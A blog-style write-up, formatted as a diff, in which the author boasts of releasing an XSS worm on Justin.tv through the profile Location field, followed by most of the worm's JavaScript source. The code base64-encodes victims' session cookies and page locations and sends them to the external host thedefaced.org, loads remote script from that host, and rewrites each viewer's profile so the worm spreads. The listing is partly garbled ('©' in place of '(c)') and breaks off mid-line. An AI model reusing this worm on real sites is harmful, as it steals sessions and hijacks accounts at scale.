@@ -1,0 +1,227 @@
+XSS worms are pretty neat, interactive worms that propagate by using a client's browser to progressively infect other profiles in some way. I wrote my own worm a while back, and I wanted to talk about how it worked, how it was affective, and what challenges I faced.
+
+The worm I created was in Justin.Tv. The best thing about XSS worms is that they're as unique as the XSS. Tons of different things may occur, and it's up to many different variables that the worm is successful.
+
+The XSS in justin.tv was found by x2Fusion. x2Fusion and I worked on the worm right when we came up with the idea of making one.
+
+The XSS was in the Location field. So, people viewing another user's profile would run whatever we put there, as it was not sanitized. But there was one more challenge: the location was placed in the title sanitized. We had to find a way to not only hide the worm in the title, but we also had to impliment some javascript that automatically changed the title as soon as it loaded.
+
+Once we started on the worm, we made the .js file on an external website, and before script inclusion we put several HTML comment tags to hide it in the title. In the location javascript, we edited the location javascript (local) to dynamically remove the title, keeping it stealthy (as possible) to avoid other issues. The local javascript also made a hidden, blank iFrame that we could reference in the remove javascript.
+
+To start off, the remote javascript would force the iframe to our website and provide, dynamically, the client's cookies and profile location. We would use this to track what profiles were infected by who, and when, and all of the client details at the time.
+
+We would create the payload inside the remote javascript that we can use to inject with the viewing user's profile. The "payload" data is pretty much our local javascript. We also added a ^ (rare location element, if you ask me) character after the user's location, which our local javascript will use to manage the dynamic script.
+
+What we didn't think about, well... we were in a hurry so it's not our fault, ^ would remain on the titles. People would definately notice, but it wasn't patched until about 24 hours after.
+
+We printed a new iFrame (hidden), and used it to read out the details in convinient little sub-frame form elements. We took the elements and processed them, only changing the Location field if it wasn't already infected, and then sending the request (if it wasn't already infected).
+
+This was more complicated as it seemed... we had to fight between IE and Firefox (Safari follows Firefox for the most part) compatibility. After doing that, we realized... if the infected person was... well an actual broadcaster, the default page wasn't what we were looking for. Thus, we needed to dynamically read whether certain elements were given on the page, and also go to the correctly named page.
+
+We had another request upon new infections that saved user details.
+
+Once the request was sent, by then it is assumed the profile was infected and we have it recorded on our side. In-fact, quickly after we released it, I made a quick little PHP script that waited for more accounts to be infected (and their userdetails), and printed out a highlighted table element had it fade out after 5 seconds. After about 1500 profiles, I sat there watching 4 to 10 be infected a second, and it was funny to watch them be infected life.
+
+Actually, check it out:
+
+function URLEncode (clearString) 
+    { 
+    var output = ''; 
+    var x = 0; 
+    clearString = clearString.toString(); 
+    var regex = /(^[a-zA-Z0-9_.]*)/; 
+ 
+    while (x < clearString.length) 
+        { 
+        var match = regex.exec(clearString.substr(x)); 
+ 
+        if (match != null && match.length > 1 && match[1] != '') 
+            { 
+            output += match[1]; 
+            x += match[1].length; 
+            } 
+ 
+        else 
+            { 
+            if (clearString[x] == ' ') 
+                output += '+'; 
+ 
+            else 
+                { 
+                var charCode = clearString.charCodeAt(x); 
+                var hexVal = charCode.toString(16); 
+                output += '%' + (hexVal.length < 2 ? '0' : '') + hexVal.toUpperCase(); 
+                } 
+            x++; 
+            } 
+        } 
+    return output; 
+    } 
+ 
+function save_settings(action, enctype, method, query) 
+    { 
+    var xmlHttp; 
+ 
+    try 
+        { 
+        xmlHttp = new XMLHttpRequest(); 
+        } 
+    catch (e) 
+        { 
+        try 
+            { 
+            xmlHttp = new ActiveXObject("Msxml2.XMLHTTP"); 
+            } 
+        catch (e) 
+            { 
+            try 
+                { 
+                xmlHttp = new ActiveXObject("Microsoft.XMLHTTP"); 
+                } 
+            catch (e) 
+                { 
+                return false; 
+                } 
+            } 
+        } 
+    xmlHttp.open(method, action, true); 
+    xmlHttp.setRequestHeader('Content-Type', enctype); 
+    xmlHttp.send(query); 
+    return false; 
+    } 
+document.title = document.title.split('^')[0] + " - Justin.tv"; 
+var base64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'.split(""); 
+var base64inv = { 
+}; 
+ 
+for (var i = 0; i < base64chars.length; i++) 
+    { 
+    base64inv[base64chars[i]] = i; 
+    } 
+ 
+function b64_d (s) 
+    { 
+    s = s.replace(new RegExp('[^' + base64chars.join("") + '=]', 'g'), ""); 
+    var p = (s.charAt(s.length - 1) == '=' ? (s.charAt(s.length - 2) == '=' ? 'AA' : 'A') : ""); 
+    var r = ""; 
+    s = s.substr(0, s.length - p.length) + p; 
+ 
+    for (var c = 0; c < s.length; c += 4) 
+        { 
+        var n = (base64inv[s.charAt©] << 18) + (base64inv[s.charAt(c + 1)] << 12) + (base64inv[s.charAt(c + 2)] << 6) 
+            + base64inv[s.charAt(c + 3)]; 
+        r += String.fromCharCode((n >>> 16) & 255, (n >>> 8) & 255, n & 255); 
+        } 
+    return r.substring(0, r.length - p.length); 
+    } 
+ 
+function b64_e(s) 
+    { 
+    var r = ""; 
+    var p = ""; 
+    var c = s.length % 3; 
+ 
+    if (c > 0) 
+        { 
+        for (;c < 3; c++) 
+            { 
+            p += '='; 
+            s += "\0"; 
+            } 
+        } 
+ 
+    for (c = 0; c < s.length; c += 3) 
+        { 
+        if (c > 0 && (c / 3 * 4) % 76 == 0) 
+            { 
+            r += "\r\n"; 
+            } 
+        var n = (s.charCodeAt© << 16) + (s.charCodeAt(c + 1) << 8) + s.charCodeAt(c + 2); 
+        n = [(n >>> 18) & 63, (n >>> 12) & 63, (n >>> 6) & 63, n & 63]; 
+        r += base64chars[n[0]] + base64chars[n[1]] + base64chars[n[2]] + base64chars[n[3] 
+]; 
+        } 
+    return r.substring(0, r.length - p.length) + p; 
+    } 
+document.getElementById('tframeid').src = "http://thedefaced.org/jtv/jtv_test.php?act=mesh&cookie=" 
+    + b64_e(document.cookie) + "&location=" + b64_e(String(window.location)); 
+document.write(""); 
+payload = b64_d( 
+    "XjwhLS1BbGwgb3BlbmluZ3MgaW4gYW4gaW50ZXJuYWwgb3IgZXh0ZXJuYWwgZmxvYXRpbmcgcm9 
+vZiBleGNlcHQgZm9yIGF1dG9tYXRpYyBibGVlZGVyIHZlbnRzICh2YWN1dW0gYnJlYWtlciB2ZW50cyk 
+g 
+YW5kIHJpbSBzcGFjZSB2ZW50cyBtdXN0IHByb3ZpZGUgYSBwcm9qZWN0aW9uIGJlbG93IHRoZSBsaXF1 
+a 
+WQgc3VyZmFjZSBvciBiZSBlcXVpcHBlZCB3aXRoIGEgY292ZXIsIHNlYWwsIG9yIGxpZCwgd2hpY2ggb 
+X 
+VzdCBiZSBpbiBhIGNsb3NlZCAoaS5lLiwgbm8gdmlzaWJsZSBnYXApIHBvc2l0aW9uIGF0IGFsbCB0aW 
+1 
+lcyBleGNlcHQgd2hlbiB0aGUgZGV2aWNlIGlzIGluIGFjdHVhbCB1c2UuLS0+IDxpZnJhbWUgaWQ9J3R 
+m 
+cmFtZWlkJyB3aWR0aD0wIGhlaWdodD0wIGZyYW1lYm9yZGVyPTA+PC9pZnJhbWU+PHNjcmlwdCBzcmM9 
+I 
+mh0dHA6Ly90aGVkZWZhY2VkLm9yZy9qdHYvanR2X3Rlc3QucGhwP2FjdD1qcyIgbGFuZ3VhZ2U9Imphd 
+m 
+FzY3JpcHQiPjwvc2NyaXB0PiA8IS0tQWxsIG9wZW5pbmdzIGluIGFuIGludGVybmFsIG9yIGV4dGVybm 
+F 
+sIGZsb2F0aW5nIHJvb2YgZXhjZXB0IGZvciBhdXRvbWF0aWMgYmxlZWRlciB2ZW50cyAodmFjdXVtIGJ 
+y 
+ZWFrZXIgdmVudHMpIGFuZCByaW0gc3BhY2UgdmVudHMgbXVzdCBwcm92aWRlIGEgcHJvamVjdGlvbiBi 
+Z 
+WxvdyB0aGUgbGlxdWlkIHN1cmZhY2Ugb3IgYmUgZXF1aXBwZWQgd2l0aCBhIGNvdmVyLCBzZWFsLCBvc 
+i 
+BsaWQsIHdoaWNoIG11c 
+3QgYmUgaW4gYSBjbG9zZWQgKGkuZS4sIG5vIHZpc2libGUgZ2FwKSBwb3NpdGlvbiBhdCBhbGwgdGltZ 
+XMgZXhjZXB0IHdoZW4gdGhlIGRldmljZSBpcyBpbiBhY3R1YWwgdXNlLi0tPg=="); 
+document.getElementById('tframeset').onload = function () 
+    { 
+    if (frames['tframeset'].document.getElementById('user_location').value.indexOf( 
+        'All openings in an internal or external floating roof') 
+        == -1) 
+        { 
+        query = "section=profile&session_user="; 
+        query += frames['tframeset'].document.getElementById('session_user').value; 
+        query += "&subsection=profile_info"; 
+        query += "&commit=Save%20Changes"; 
+ 
+        if (frames['tframeset'].document.getElementById('user_hide_im_watching').value != 1) 
+            { 
+            query += "&user[hide_profile_actions]=0"; 
+            } 
+ 
+        else 
+            { 
+            query += "&user[hide_profile_actions]=1"; 
+            }; 
+ 
+        if (frames['tframeset'].document.getElementById('user_hide_profile_actions').value != 1) 
+            { 
+            query += "&user[hide_profile_actions]=0"; 
+            } 
+ 
+        else 
+            { 
+            query += "&user[hide_profile_actions]=1"; 
+            }; 
+        query += "&user[profile_about]=" 
+            + URLEncode(frames['tframeset'].document.getElementById('user_profile_about').value); 
+        query += "&user[favorite_quotes]=" 
+            + URLEncode(frames['tframeset'].document.getElementById('user_favorite_quotes').value); 
+        query += "&user[interests]=" + URLEncode(frames['tframeset'].document.getElementById('user_interests').value); 
+        query += "&user[location]=" 
+            + URLEncode(frames['tframeset'].document.getElementById('user_location').value + payload); 
+        query += "&user[sex]=" + frames['tframeset'].document.getElementById('user_sex').value; 
+        query += "&user[name]=" + URLEncode(frames['tframeset'].document.getElementById('user_name').value); 
+        save_settings('/settings', 'application/x-www-form-urlencoded', 'POST', query); 
+        } 
+    document.getElementById('tframeset').onload = function () 
+        { 
+        }; 
+ 
+    document.getElementById('tframeset').onreadystatechange = function () 
+        { 
+        }; 
+    }; 
+ 
+document.getElementById('tframeset').onreadyst
+
